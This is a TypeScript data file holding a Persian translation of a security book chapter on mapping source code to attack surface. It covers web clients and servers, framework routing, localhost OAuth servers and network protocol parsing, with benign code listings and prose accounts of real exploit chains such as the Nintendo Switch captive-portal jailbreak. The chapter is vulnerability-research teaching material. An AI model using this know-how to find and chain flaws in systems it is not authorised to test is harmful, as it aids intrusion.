import { Chapter } from "@/types/reader";

export const CHAPTER_2_FA: Chapter = {
  id: "ch-2",
  title: "فصل ۲: نگاشت کد به سطح حمله (Mapping Code to Attack Surface)",
  readingTimeMinutes: 53,
  content: `# فصل ۲: نگاشت کد به سطح حمله (Mapping Code to Attack Surface)

> *"وقتی بدانیم کجاییم، جهان به باریکی یک نقشه می‌شود. اما وقتی ندانیم، جهان بی‌انتها و نامحدود به نظر می‌رسد."*  
> — لیو سیشین (Liu Cixin)، *مسئله سه جسم: جنگل تاریک (The Dark Forest)*

هر چه نرم‌افزار پیچیده‌تر می‌شود، **سطح حمله (Attack Surface)** آن — یعنی شمار نقاط ورودی بالقوه برای بهره‌برداری از یک آسیب‌پذیری — نیز گسترش می‌یابد. علاوه بر این، ویژگی‌های جدید غالباً به معنای کدهای عجولانه یا کمتر سخت‌سازی‌شده هستند، در حالی که ویژگی‌های قدیمی‌تر می‌توانند به کدهای رهاشده، نگهداری‌نشده یا منسوخ‌شده (Deprecated) بدل شوند. هر دوی این حالات فرصت‌هایی زرین برای رخنه و پیدایش آسیب‌پذیری‌ها به شمار می‌روند؛ چرا که توان توسعه‌دهندگان برای ایمن‌سازی تمام و کمال این قابلیت‌ها محدود است و هنگام سر و کار داشتن با میلیون‌ها سطر کد، خطای انسانی اجتناب‌ناپذیر خواهد بود. افزون بر این، اثر مخرب این باگ‌ها رشدی خطی ندارد؛ باگ‌های کوچک و جزئی می‌توانند زنجیره‌وار به یکدیگر متصل شده (Chained) و آسیب‌پذیری‌هایی بسیار فاجعه‌بارتر بیافرینند. به طور خلاصه: هر چه یک هدف پیچیده‌تر باشد، پتانسیل کشف آسیب‌پذیری در آن بالاتر است.

برای نمونه، نرم‌افزار Microsoft Excel نه تنها فرمت‌های مرسوم کتاب‌های اکسل (\`.xls\` و \`.xlsx\`) را پردازش می‌کند، بلکه از فرمت‌های پیوند نمادین (\`.slk\`)، دیتابیس dBase (\`.dbf\`)، تبادل داده یا Data Interchange Format (\`.dif\`) و ده‌ها قالب دیگر نیز پشتیبانی می‌کند. و این‌ها تنها بردارهای ورودی از جنس فایل هستند؛ شما باید نگران ارتباطات بین‌فرایندی (IPC) و دیگر بردارهای تحت شبکه نیز باشید. برای مثال، فرایندی دیگر می‌تواند اکسل را از طریق اینترفیس‌های مدل شیء مؤلفه‌ای یا Component Object Model (COM) کنترل کند، یا ممکن است نرم‌افزار از طریق اتصالات داده‌های خارجی، اطلاعاتی را از اینترنت واکشی نماید. تمام این موارد منابع بالقوه‌ای برای آسیب‌پذیری‌های با قابلیت اکسپلویت محسوب می‌شوند.

سطوح حمله وسیع نرم‌افزارهای مدرن می‌توانند برای پژوهشگران امنیت بسیار گیج‌کننده و هولناک باشند. پژوهشگران کم‌تجربه‌تر در حوزه آسیب‌پذیری ممکن است تلاش کنند تا تک‌تک منابع ورودی ممکن را بیازمایند؛ رویکردی که آن‌ها را به بیراهه‌ها و سیاه‌چاله‌های بی‌پایان (Rabbit Holes) کشانده و توان و زمانشان را هدر می‌دهد. اگرچه این تاکتیک در سناریوی **جعبه سیاه (Black-Box)** — که در آن پژوهشگر صرفاً به برون‌دادها و ورودی‌های بیرونی و قابل دسترس هدف محدود است — تا حدی منطقی به نظر می‌رسد، اما **بازبینی کد منبع (Code Review)** ابزاری فوق‌العاده کارآمدتر برای محدود کردن دامنه جستجو فراهم می‌سازد. به عنوان مثال، در پژوهش روی یک وب‌اپلیکیشن، به جای تست کورکورانه و حمله Brute-Force به مسیرها برای گریز از محدودیت‌های نرخ درخواست (Rate Limits) و دیوارهای آتش وب (WAF)، می‌توانید به سادگی به کدهای مسیریابی (Routing) نگاهی بیندازید.

این فصل شما را با متداول‌ترین بردارهای حمله آشنا کرده و نحوه شناسایی و تحلیل آن‌ها را در سطح کد منبع آموزش می‌دهد. ما با بردارهای راه دور مانند وب و سایر پروتکل‌های شبکه آغاز خواهیم کرد، سپس به سراغ روش‌های ارتباط بین‌فرایندی (IPC) محلی خواهیم رفت. در نهایت، بررسی عمیقی روی فرمت‌های فایل و نحوه تحلیل آن‌ها به منظور کشف پیاده‌سازی‌های آسیب‌پذیر خواهیم داشت. برای هر سطح حمله، نمونه کدهایی واقعی را که سبب شکل‌گیری آن بردار شده‌اند بررسی خواهیم کرد. همچنین الگوهای متداولی را که نشان‌دهنده نقاط ضعف در سایر بخش‌های کد هستند یاد خواهید گرفت. بیایید با پیمایش بزرگ‌ترین سطح حمله دنیا کار را آغاز کنیم: **اینترنت**.

---

## اینترنت (The Internet)

در گذشته، برنامه‌های بومی (Native) و برنامه‌های تحت وب در دو دنیای کاملاً مجزا سیر می‌کردند: برنامه‌های بومی به صورت باینری‌های کد ماشین کامپایل می‌شدند و روی پلتفرم‌ها و سخت‌افزارهای مشخصی به اجرا درمی‌آمدند، در حالی که برنامه‌های وب عمدتاً با زبان‌های مخصوص وب نوشته شده و محتوای HTML، JavaScript و CSS را برای مرورگرها تولید می‌کردند. در نتیجه، این دو دسته سطح حمله، بردارهای اکسپلویت و ابزارهای تحلیلی کاملاً متفاوتی داشتند.

با این وجود، تحولات توسعه نرم‌افزار مدرن موجب ورود گسترده فناوری‌های وب به محیط‌های سنتی و غیروبی شده است. از Node.js گرفته تا WebAssembly، همپوشانی روزافزونی میان اپلیکیشن‌های بومی و ابزارهای تحت مرورگر شکل گرفته و نرم‌افزارهای دسکتاپ و سیستمی به طور فزاینده‌ای قابلیت‌های وب را برای پشتیبان‌گیری، کنترل از راه دور، و احراز هویت در خود جای داده‌اند. این امر شناخت سطوح حمله وب و الگوهای کدهای آسیب‌پذیر را حیاتی‌تر از همیشه ساخته است. در ادامه، یاد خواهید گرفت که چگونه آسیب‌پذیری‌های کلاینت و سرور را هنگام بازبینی کد ردیابی کنید.

---

### آسیب‌پذیری‌های کلاینت وب (Web Client Vulnerabilities)

اگرچه وب‌سرورها به دلیل دردسترس‌بودن و عمومیت فراوان همواره یکی از محبوب‌ترین اهداف حمله بوده‌اند، اما آسیب‌پذیری‌های سمت کلاینت نیز، به ویژه در برنامه‌های بومی دسکتاپ و موبایل، شیوع بالایی دارند. آسیب‌پذیری کلاینت وب زمانی رخ می‌دهد که یک نرم‌افزار تلاش می‌کند داده‌هایی را از وب بارگذاری کند اما آن داده‌ها را به شیوه‌ای ناامن پردازش و مدیریت می‌نماید. بیایید نگاهی به متداول‌ترین بردارهای حمله و چگونگی شناسایی آن‌ها بیندازیم.

#### بردارهای حمله (Attack Vectors)
بردارهای حمله بسته به نحوه پارس کردن داده‌ها توسط نرم‌افزار به شدت متغیر هستند؛ از واکشی ساده یک سند JSON گرفته تا اجرای یک مرورگر بدون سر (Headless Browser) تمام‌عیار با پشتیبانی از جاوااسکریپت. همچنین سطح حمله مستقیماً به این بستگی دارد که مهاجم چه میزان کنترل روی مقصد اتصالی نرم‌افزار دارد. این فاکتورها دامنه تحلیل کد منبع و نوع آسیب‌پذیری‌های مورد جستجو را تعیین می‌کنند.

چنانچه نرم‌افزار صرفاً به یک دامنه یا URL هاردکدشده متصل شود، اکسپلویت هر نقصی نیازمند حمله **مرد میانی (Man-in-the-Middle - MITM)** خواهد بود که در آن مهاجم داده‌های ارسالی سرور به کلاینت را شنود و دستکاری می‌کند. این سناریو مستلزم سطحی از تسلط مهاجم بر بستر شبکه یا دیوایس تحت اجرای نرم‌افزار است.

برای مثال، در سال ۲۰۱۷ پژوهشگران کشف کردند که کنسول بازی **Nintendo Switch** از یک مرورگر قدیمی مبتنی بر WebKit برای باز کردن پرتال‌های تحت وب وای‌فای (پرتال‌های لاگین موسوم به Captive Portals در هتل‌ها و فرودگاه‌ها) استفاده می‌کند. این مرورگر منسوخ در برابر آسیب‌پذیری **CVE-2016-4657** (یک باگ فساد حافظه در WebKit که منجر به اجرای کد دلخواه می‌شد) آسیب‌پذیر بود.

کنسول سوییچ جهت بررسی وجود پرتال کپتیو، آدرس \`http://conntest.nintendowifi.net\` را فراخوانی کرده و پاسخ دریافتی را با رشته مورد انتظار \`This is test.html page\` مطابقت می‌داد. یک پرتال کپتیو در حالت عادی ابتدا تمامی درخواست‌ها را به صفحه لاگین خود ریدایرکت کرده و بدنه متفاوتی برمی‌گرداند که سبب می‌شد سوییچ صفحه لاگین را درون مرورگر وب باز کند. مهاجم برای ربودن این جریان می‌توانست تنظیمات سامانه نام دامنه (DNS) کنسول (یا روتر متصل به آن) را دستکاری کرده و آن را به وب‌سروری تحت کنترل خود که حامل اکسپلویت CVE-2016-4657 بود هدایت نماید.

برای برخی اهداف، پیش‌شرط اجرای MITM ممکن است حمله را بیش از حد دشوار یا غیرعملی سازد. اما در مورد کنسول نینتندو سوییچ، از آنجا که این اکسپلویت امکان **جیل‌بریک (Jailbreak)** دستگاه و عبور از مرزهای امنیتی سخت‌افزاری با اجرای فرامین دلخواه روی یک سیستم بسته و قفل‌شده را فراهم می‌کرد، ارزش صرف زمان و توسعه را داشت.

از سوی دیگر، داشتن کنترل جزئی یا کامل بر روی URL درخواستی کلاینت، افق بسیار گسترده‌تری از فرصت‌های اکسپلویت را می‌گشاید. برای مثال، هنگام تست نرم‌افزار دسکتاپ **Facebook Gameroom**، متوجه شدم که اسکیمای سفارشی شناسانه منبع یکنواخت (URI Scheme) ثبت‌شده آن به صورت \`fbgame://gameid/\` قابل دستکاری است تا برنامه را وادار کند صفحات مختلفی روی دامنه \`https://apps.facebook.com\` را درون مرورگر مبتنی بر کرومیوم تعبیه‌شده خود باز کند. با استفاده از چند ابزار ریدایرکت (Redirection Gadgets) روی آن دامنه، توانستم مرورگر را به سمت پی‌لود مخرب خود در دامنه‌ای دیگر ریدایرکت کنم که با فعال‌سازی یک آسیب‌پذیری فساد حافظه (**CVE-2018-6056**) روی نسخه قدیمی کرومیوم به نتیجه رسید.

ترکیب یک بردار ورودی محلی (مانند اسکیمای سفارشی URI) با زنجیره‌ای از گجت‌های تحت وب، به دلیل رشد روزافزون مرورگرهای داخلی در اپلیکیشن‌های دسکتاپ، به یکی از شایع‌ترین الگوهای اکسپلویت بدل گشته است.

#### شناسایی و طبقه‌بندی (Identification and Classification)
عملکردهای کلاینت وب را می‌توان در کد منبع با جستجوی رابط‌های برنامه‌نویسی کاربردی (APIها) و توابع کتابخانه‌ای مرتبط با وب شناسایی و رده‌بندی کرد. توسعه‌دهندگان معمولاً برای ارسال درخواست‌ها و پارس پاسخ‌ها از کتابخانه‌های استانداردی بهره می‌برند که مستندات عمومی آن‌ها در دسترس است.

برای مثال، در پلتفرم دات‌نت (\`.NET\`)، کلاس \`WebRequest\` در کتابخانه \`System.Net.Requests.dll\` قرار دارد. با مطالعه مستندات رسمی مایکروسافت، می‌توان با سازنده‌ها، خصوصیات و متدهای آن آشنا شد.

با کسب تجربه، کتابخانه‌ها و SDKهای محبوب را سریعاً شناسایی خواهید کرد. این مهارت به شما امکان می‌دهد وسعت سطح حمله کلاینت وب را بلافاصله بسنجید. به عنوان نمونه، نگارنده از طریق مشاهده ایمپورت فایل \`CefSharp.dll\` (یک پوشش دات‌نت برای چارچوب Chromium Embedded Framework) متوجه وجود مرورگر تعبیه‌شده در Facebook Gameroom شد و با ردیابی توابع CefSharp در کدهای دی‌کامپایل‌شده سی‌شارپ، نقاط ورود و بردارهای وب کلاینت برنامه را تعیین کرد.

به فهرست ۲-۱ توجه کنید که یک کلاینت ساده بدون سر (Offscreen) با فریمورک CefSharp را برای بارگذاری صفحه وب نشان می‌دهد:

\`\`\`csharp
// CefSharpClient.cs
using System;
using CefSharp;
using CefSharp.OffScreen;

class Program
{
    static void Main(string[] args)
    {
        const string testUrl = "https://www.google.com/";
        Cef.Initialize(new CefSettings());
        var browser = new ChromiumWebBrowser();
        ❶ browser.Load(testUrl);
        Console.ReadKey();
        Cef.Shutdown();
    }
}
\`\`\`
*فهرست ۲-۱: یک کلاینت ساده آف‌اسکرین با فریمورک CefSharp*

بر اساس این قطعه کد نمونه، فراخوانی \`ChromiumWebBrowser.Load\` در نقطه ❶ بخش کلیدی کد برای شناسایی بردارهای حمله از طریق یک URL تحت کنترل مهاجم است. طبق مستندات CefSharp، متد \`LoadUrlAsync\` گزینه دیگری برای این منظور به شمار می‌آید.

این توابع از دیدگاه فنی به چاهک‌ها (Sinks) نزدیک‌ترند تا منبع‌ها؛ این مسئله نکته‌ای مهم را برجسته می‌سازد: هنگامی که سطح حمله یک نرم‌افزار را در مقیاس کلان (Macro Level) ارزیابی می‌کنید، تمایز میان منابع و چاهک‌ها کم‌رنگ می‌شود. در عوض، باید روی شناسایی کدهایی تمرکز کنید که از طریق ورودی‌های بیرونی **قابل دسترسی (Reachable)** هستند.

مدل‌سازی تهدید (Threat Modeling) به شما امکان می‌دهد دسته‌های کلیدی آسیب‌پذیری‌ها و بخش‌های مرتبط کد منبع را اولویت‌بندی کنید و پس از آن، تکنیک ردیابی چاهک به منبع را برای توسعه اکسپلویت‌های واقعی به کار گیرید.

این رویکرد شناسایی کتابخانه‌های کلاینت HTTP را می‌توان به انواع دیگر کدهای منبع نیز تعمیم داد. استفاده از کلاینت‌های HTTP صرفاً محدود به برنامه‌های سمت کلاینت نیست؛ کل خانواده آسیب‌پذیری‌های **جعل درخواست سمت سرور (SSRF)** دقیقاً به این دلیل وجود دارد که سرویس‌های سمت سرور نیز ناگزیرند درخواست‌های وب ارسال کنند.

---

### آسیب‌پذیری‌های سرور وب (Web Server Vulnerabilities)

طیف وسیعی از نرم‌افزارها، از سیستم‌عامل دستگاه‌های اینترنت اشیاء (IoT) تا وب‌اپلیکیشن‌های توزیع‌شده، از نوعی وب‌سرور استفاده می‌کنند. از آنجا که بررسی تمام آسیب‌پذیری‌های وب نیازمند نگارش کتابی مستقل است، تمرکز ما روی نحوه شناسایی و نگاشت سطح حمله سرور وب از روی کد منبع خواهد بود.

#### فریمورک‌های وب (Web Frameworks)
برنامه‌های وب پیچیده معمولاً به فریمورک‌هایی متکی هستند که الگوهای متداول کدنویسی را انتزاعی و استاندارد می‌کنند تا حجم کدهای مورد نیاز کاهش یابد. به فهرست ۲-۲ نگاه کنید که یک وب‌سرور را در Node.js با استفاده از کتابخانه بومی \`http\` پیاده‌سازی کرده است:

\`\`\`javascript
// httpserver.js
const http = require('http');

const server = http.createServer((req, res) => {
    res.statusCode = 200;
    ❶ if (req.method === 'GET') {
        if (req.url === '/') {
            return res.end('index');
        }
        if (req.url === '/items') {
            return res.end('read all items');
        }
        ❷ if (req.url.startsWith('/items/')) {
            const id = req.url.split('/')[2];
            return res.end(\`read item \${id}\`);
        }
    } else if (req.method === 'POST') {
        if (req.url === '/items') {
            return res.end('create an item');
        }
    }
    res.statusCode = 404;
    return res.end();
});

server.listen(8080, () => {
    console.log('Server running at http://localhost:8080/');
});
\`\`\`
*فهرست ۲-۲: یک وب‌سرور ساده در Node.js بدون فریمورک*

این نمونه دشواری‌های نگهداری برنامه‌های بزرگ وب بدون فریمورک را آشکار می‌سازد. تفکیک متدهای GET و POST متکی بر شرط‌های تودرتوی دست‌وپاگیر است ❶ و برای استخراج پارامترهای مسیر نظیر شناسه آیتم‌ها از عملیات‌های شکننده رشته‌ای استفاده می‌شود ❷. حال این کد را با فهرست ۲-۳ که از فریمورک Express بهره می‌برد مقایسه کنید:

\`\`\`javascript
// expressserver.js
const express = require('express');
const app = express();
const itemsRouter = express.Router();

❶ itemsRouter.get('/', (req, res) => {
    res.send('read all items');
});

itemsRouter.post('/', (req, res) => {
    res.send('create an item');
});

itemsRouter.get('/:id', (req, res) => {
    ❷ const { id } = req.params;
    res.send(\`read item \${id}\`);
});

app.get('/', (req, res) => {
    res.send('index');
});

app.use('/items', itemsRouter);

app.listen(8080, () => {
    console.log('Server running at http://localhost:8080/');
});
\`\`\`
*فهرست ۲-۳: یک وب‌سرور توسعه‌یافته با فریمورک Express*

اکسپرس نه تنها با کدی کوتاه‌تر همان عملکرد را ارائه می‌دهد، بلکه وظایف تکراری نظیر تفکیک متدهای درخواست ❶، استخراج پارامترهای مسیر ❷، و مدیریت خطاهای ۴۰۴ را به طور خودکار انجام می‌دهد. همچنین می‌توان روترها را به فایل‌های مجزا منتقل کرد که خوانایی کد را هم برای توسعه‌دهنده و هم برای شما به عنوان تحلیل‌گر امنیت بسیار بالا می‌برد.

#### معماری مدل–نما–کنترل‌کننده (MVC)
یکی از الگوهای رایج در فریمورک‌های وب، معماری Model–View–Controller یا به اختصار MVC است که کد را به سه مؤلفه تفکیک می‌کند:
- **مدل (Model):** مدیریت «منطق کسب‌وکار» (Business Logic) و ساختار داده‌ها و ارتباط با پایگاه داده.
- **نما (View):** مدیریت رابط کاربری نظیر قالب‌ها (Templates)، صفحات HTML یا خروجی‌های بصری.
- **کنترل‌کننده (Controller):** هدایت جریان داده و منطق برنامه از درخواست‌های دریافتی به مدل‌ها و نماها.

کدهای مسیریابی معمولاً در مجاورت مؤلفه‌های کنترلر قرار دارند. برای نمونه، اگر سرور اکسپرس فهرست ۲-۳ را به فریمورک **Spring MVC** در جاوا منتقل کنیم، کنترلر به صورت فهرست ۲-۴ خواهد بود:

\`\`\`java
// ItemController.java
package com.example.demo;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import org.springframework.ui.Model;
import java.util.Map;

❶ @Controller
@RequestMapping("/items")
public class ItemController {
    private final ItemService itemService;

    @Autowired
    public ItemController(ItemService itemService) {
        this.itemService = itemService;
    }

    @RequestMapping(method = RequestMethod.GET)
    @ResponseBody
    public Map<String, Item> readAllItems() {
        return itemService.getAllItems();
    }

    @RequestMapping(method = RequestMethod.POST)
    ❷ public String createItem(ItemForm item) {
        itemService.createItem(item);
        return "redirect:/items";
    }

    @RequestMapping(value = "/{id}", method = RequestMethod.GET)
    @ResponseBody
    public Item readItemForId(@PathVariable int id, Model model) {
        return itemService.getItemById(id);
    }
}
\`\`\`
*فهرست ۲-۴: نمونه کنترل‌کننده در فریمورک Spring MVC*

این قطعه کد چالش‌های مهمی را در تحلیل فریمورک‌های وب به تصویر می‌کشد. نخست اینکه انتزاع‌های فریمورک در ازای پنهان کردن کدهای تکراری، شفافیت را کاهش می‌دهند؛ زیرا حجم عظیمی از پردازش‌ها در پشت صحنه توسط فریمورک انجام می‌شود. خوشبختانه مشخص است که حاشیه‌نویسی (Annotation) علامت \`@RequestMapping\` در نقطه ❶ متدها را به مسیرهای مشخصی متصل می‌کند. اما برای درک حاشیه‌نویسی‌هایی نظیر \`@Autowired\` باید با مکانیزم تزریق وابستگی (Dependency Injection) اسپرینگ آشنا بود.

به عملکرد \`createItem\` در نقطه ❷ دقت کنید که رشته \`"redirect:/items"\` را برمی‌گرداند. پیشوند \`:redirect\` مشخص می‌کند که کاربر باید به نشانی بعدی هدایت شود. فریمورک‌ها معمولاً از قراردادهایی مانند پیشوندها یا الگوهای خاص برای تعیین مسیرها استفاده می‌کنند و شما باید این قراردادها را به درستی تفسیر کنید.

افزون بر این، مسیرها ممکن است در یک فایل واحد تعریف نشده باشند، بلکه از کلاس‌های دیگر به ارث برده شوند. برای نمونه به کنترلر فهرست ۲-۵ نگاه کنید:

\`\`\`java
// ThingController.java
@Controller
@RequestMapping("/things")
❶ public class ThingController extends ItemController {

    ❷ @RequestMapping(value = "/price", method = RequestMethod.GET)
    public ModelAndView getPrice() {
        // کدهای کنترلر قیمت
        return new ModelAndView("price");
    }
}
\`\`\`
*فهرست ۲-۵: یک کلاس کنترل‌کننده که از کنترل‌کننده دیگری ارث‌بری می‌کند*

این کنترلر علاوه بر تعریف مسیر \`/things/price\` در نقطه ❷، متدها و روت‌های پیشین را از \`ItemController\` به ارث می‌برد ❶. بنابراین به ویژه در زبان‌های شیءگرا، ارزیابی جامع روابط ارث‌بری برای کشف کامل روت‌ها الزامی است.

#### تحلیل فریمورک‌های ناشناخته یا غیرمعمول
برخی نرم‌افزارها ممکن است از فریمورک‌های سفارشی استفاده کنند یا بدون هرگونه فریمورکی توسعه یافته باشند. برای تحلیل مؤثر این دست کدها، روی مؤلفه‌های بنیادی درخواست‌های پروتکل HTTP تمرکز نمایید. یک درخواست نوعی به شکل زیر است:

\`\`\`http
POST /items HTTP/1.1
Host: localhost
Content-Type: application/json

{
  "name": "Apple",
  "price": 1
}
\`\`\`

برنامه باید مؤلفه‌های زیر را پردازش کند:
1. **متد درخواست (Request Method):** تفکیک میان GET یا POST چگونه انجام شده است؟ آیا مقایسه رشته‌ای است یا دکوراتورهایی نظیر \`@GetMapping\`؟
2. **شناسانه منبع (URI):** جستجوی رشته‌های مسیرمحور برای یافتن هندلرها، و شناسایی فایل‌های تنظیمات مسیر (نظیر \`config/routes.rb\` در Ruby on Rails).
3. **هدرها (Headers):** جستجو برای هدرهایی چون \`Origin\` یا \`Content-Type\` که ممکن است در میان‌افزارها اعتبارسنجی شوند.
4. **پارامترها (Parameters):** واکشی پارامترها از کوئری‌استرینگ، مسیر URL، یا بدنه درخواست (JSON).

سپس نحوه بازگرداندن پاسخ را بررسی کنید:

\`\`\`http
HTTP/1.1 201 Created
Content-Type: application/json
Cache-Control: no-cache

{
  "id": 1337,
  "name": "Apple",
  "price": 1
}
\`\`\`

با تمرکز بر این عناصر بنیادی، قادر خواهید بود معماری هر فریمورک وب را با سرعت رمزگشایی کنید.

---

### سطوح حمله غیرسنتی در وب (Nontraditional Web Attack Surfaces)

سطح حمله وب نرم‌افزارها محدود به اندپوینت‌های معمول HTTP نیست؛ پروتکل‌هایی چون WebDAV یا RSS، و همچنین WebSockets و WebRTC سطح حمله وب را گسترش می‌دهند.

افزون بر این، وجود سطح حمله وب به معنای جستجوی انحصاری برای آسیب‌پذیری‌هایی مانند تزریق SQL نیست. به عنوان مثال، در جریان مسابقه **Pwn2Own Tokyo 2019**، پژوهشگری با نام مستعار **d4rkn3ss** یک آسیب‌پذیری سرریز هیپ کلاسیک را در سرویس وب \`httpd\` روتر **NETGEAR Nighthawk R6700v3** کشف و اکسپلویت کرد (آسیب‌پذیری ZDI-20-709). روی دستگاه‌های هوشمند به ندرت فریمورک‌های وب سطح بالا یافت می‌شود؛ در عوض، باینری‌های یکپارچه کامپایل‌شده‌ای اجرا می‌شوند که هم سرور وب و هم منطق برنامه را در خود دارند. این امر بستر خطاهای حافظه در کدهای وب را فراهم ساخته و تحلیل سطح حمله را به مهندسی معکوس باینری سوق می‌دهد.

نرم‌افزارهای دسکتاپ نیز گاهی وب‌سرورهای موقتی روی \`localhost\` راه‌اندازی می‌کنند. ابزار خط فرمان گیت‌هاب (GitHub CLI) هنگام ورود از طریق مرورگر، با استفاده از پکیج \`github.com/cli/oauth\` یک سرور موقت HTTP بالا می‌آورد (فهرست ۲-۶):

\`\`\`go
// oauth_webapp.go - 2020 GitHub, Inc.
func (oa *Flow) WebAppFlow() (*api.AccessToken, error) {
    // --snip--
    params := webapp.BrowserParams{
        ClientID:     oa.ClientID,
        ❶ RedirectURI:  oa.CallbackURI,
        Scopes:       oa.Scopes,
        AllowSignup:  true,
    }
    browserURL, err := flow.BrowserURL(host.AuthorizeURL, params)
    
    // راه‌اندازی وب‌سرور محلی
    go func() {
        _ = flow.StartServer(oa.WriteSuccessHTML)
    }()
    // --snip--
    // باز کردن مرورگر کاربر
    err = browseURL(browserURL)
    if err != nil {
        return nil, fmt.Errorf("error opening the web browser: %w", err)
    }
    // --snip--
    // انتظار برای دریافت کال‌بک در سرور لوکال جهت تبادل توکن با کلاینت HTTP
    ❷ return flow.Wait(
        context.TODO(),
        httpClient,
        host.TokenURL,
        webapp.WaitOptions{
            ClientSecret: oa.ClientSecret,
        },
    )
}
\`\`\`
*فهرست ۲-۶: تابع WebAppFlow در بسته oauth ابزار گیت‌هاب*

پس از احراز هویت موفق کاربر در مرورگر، جریان به نشانی بازگشتی ❶ روی وب‌سرور محلی ریدایرکت شده و برنامه با کلاینت HTTP ❷ کد مجوز را با توکن دسترسی مبادله می‌کند. وب‌سرورهای محلی می‌توانند در معرض خطراتی چون Rebinding DNS یا جعل درخواست بین‌سایتی روی \`localhost\` باشند.

---

## پروتکل‌های شبکه (Network Protocols)

نرم‌افزارها برای ارتباطات شبکه‌ای پروتکل‌های فراوانی فراتر از HTTP به کار می‌گیرند. مدل **TCP/IP** پروتکل‌های ارتباطی را در چهار لایه سازمان‌دهی می‌کند:
- **لایه کاربرد (Application):** ارتباط میان برنامه‌ها (مانند HTTP, DNS, FTP, DHCP, SNMP).
- **لایه انتقال (Transport):** ارتباط میان سیستم‌ها (مانند TCP, UDP, SCTP).
- **لایه اینترنت (Internet):** مسیریابی میان شبکه‌ها (مانند IPv4, IPv6, ICMP).
- **لایه پیوند (Link):** ارتباطات سخت‌افزاری فیزیکی (مانند اترنت، Wi-Fi، آدرس‌های MAC).

اکثر کدهایی که بازبینی می‌کنید در **لایه کاربرد** فعالیت دارند. سیستم‌عامل سوئیچ‌های شبکه **SONiC** بستری ایده‌آل برای ارزیابی سطح حمله پروتکل‌های شبکه است. بررسی مخزن کد SONiC دایرکتوری‌هایی نظیر \`ntp\`، \`openssh\`، \`snmpd\` و \`iccpd\` را نمایان می‌سازد.

برای ردیابی بردارهای حمله شبکه، از فراخوانی‌های پایه‌ای آغاز کنید: ساخت سوکت، گوش فرادادن (Listen) و دریافت داده (\`recv\` یا \`read\`). به کد راه‌اندازی سرور پروتکل ارتباط بین‌شاسی (ICCP) در نرم‌افزار SONiC (فهرست ۲-۷) توجه کنید:

\`\`\`c
/* Server socket initialization - src/iccpd/src/scheduler.c */
void scheduler_server_sock_init()
{
    int optval = 1;
    struct System* sys = NULL;
    struct sockaddr_in src_addr;

    if ((sys = system_get_instance()) == NULL)
        return;

    sys->server_fd = socket(PF_INET, SOCK_STREAM, 0); ❶
    bzero(&(src_addr), sizeof(src_addr));
    src_addr.sin_family = PF_INET;
    src_addr.sin_port = htons(ICCP_TCP_PORT); ❷
    src_addr.sin_addr.s_addr = INADDR_ANY; ❸
    // --snip--
    if (bind(sys->server_fd, (struct sockaddr*)&(src_addr), sizeof(src_addr)) < 0)
    {
        ICCPD_LOG_INFO(__FUNCTION__, "Bind socket failed. Error");
        return;
    }
}
\`\`\`
*فهرست ۲-۷: کدهای مقداردهی اولیه سرور iccpd*

از این قطعه کد کوتاه می‌توان اطلاعات کلیدی سطح حمله را استخراج کرد:
1. استفاده از \`PF_INET\` (معادل \`AF_INET\`) و \`SOCK_STREAM\` در تابع \`socket\` نشان‌دهنده یک سوکت مبتنی بر پروتکل TCP روی شبکه IPv4 است ❶.
2. پورت اتصال با \`ICCP_TCP_PORT\` تعیین شده ❷ که طبق هدر \`iccp_csm.h\` پورت **8888** است.
3. اتصال به \`INADDR_ANY\` ❸ نشان می‌دهد که سرور روی تمام اینترفیس‌ها و کارت‌های شبکه سیستم گوش به زنگ است.

بسیاری از پروتکل‌های استاندارد در اسناد **RFC** مدون شده‌اند. مطالعه RFC مشخصات دقیق پیاده‌سازی را نشان می‌دهد و شکاف میان سند استاندارد و کد نوشته‌شده، منبع اصلی کشف آسیب‌پذیری‌هاست. هنگام بازبینی کد یک پروتکل، روی دو ویژگی اصلی تمرکز کنید: **ساختارهای داده** و **رویه‌ها**.

---

### ساختارهای داده (Data Structures)
ساختارهای داده نحوه فرمت‌بندی و تجزیه داده‌ها را تعریف می‌کنند. در مخزن \`sonic-snmpagent\`، پروتکل توسعه‌پذیری SNMP (معروف به **AgentX**) پیاده‌سازی شده است. طبق سند **RFC 2741**، هدر واحدهای داده پروتکل (PDU) یک ساختار ثابت ۲۰ بایتی است که ۴ بایت نخست آن شامل \`version\`، \`type\`، \`flags\` و \`reserved\` است. این ساختار در کد پایتون فهرست ۲-۸ پیاده‌سازی شده است:

\`\`\`python
# sonic-snmpagent/src/ax_interface/pdu.py
from collections import namedtuple
import struct

class PDUHeaderTags(namedtuple('_PDUHeaderTags', ('version', 'type_', 'flags', 'reserved'))):
    # --snip--
    @classmethod
    def from_bytes(cls, byte_string):
        return cls(
            *struct.unpack('!BBBB', byte_string[:4])
        )
\`\`\`
*فهرست ۲-۸: کد پارس کردن هدر PDU در sonic-snmpagent*

این متد با رشته فرمت \`!BBBB\` داده‌ها را در ترتیب بایت شبکه (Network Byte Order / Big-Endian) به صورت چهار متغیر تک‌بایتی آن‌سند استخراج می‌کند که منطبق بر سند RFC است.

هرگاه میان ساختار داده در کد و استاندارد پروتکل ناهمخوانی وجود داشته باشد، آسیب‌پذیری شکل می‌گیرد. در فصل ۱ دیدید که چگونه سرور \`dhcp6relay\` فیلد طول آپشن را به عنوان عدد ۱۶ بیتی با حداکثر مقدار ۶۵٬۵۳۵ خواند اما آن را درون بافری ثابت با حجم ۴٬۰۹۶ بایت کپی کرد که ناقض مفاد استاندارد **RFC 8415** بود.

همچنین عباراتی مانند **MUST** و **MUST NOT** در RFCها الزامات را مشخص می‌کنند. به عنوان مثال، در RFC 2741 ذکر شده است که رشته‌های بایتی (Octet Strings) باید در آفست‌های مضرب ۴ بایت به پایان برسند و در غیر این صورت باید با بایت‌های صفر پر (Pad) شوند. اگر توسعه‌دهنده‌ای فراموش کند وجود بایت‌های پدینگ را بررسی نماید و همواره داده‌ها را با گام‌های ۴ بایتی بخواند، یک آسیب‌پذیری **خواندن فراتر از محدوده (Out-of-Bounds Read)** پدید می‌آید.

---

### رویه‌ها و ماشین‌های حالت (Procedures and State Machines)
رویه‌های یک پروتکل، قوانین و توالی مورد انتظار میان کلاینت و سرور را تعیین می‌کنند؛ از جمله:
- **دست‌تکانی (Handshaking):** تبادل پیام‌های آغازین جهت برقراری ارتباط.
- **مدیریت نشست (Session Management):** ردیابی نشست‌های مستقل میان دو طرف.
- **مدیریت حالت (State Management):** کنترل وضعیت گام‌به‌گام هر نشست.
- **کنترل جریان (Flow Control):** مدیریت نرخ و نظم تبادل داده‌ها.
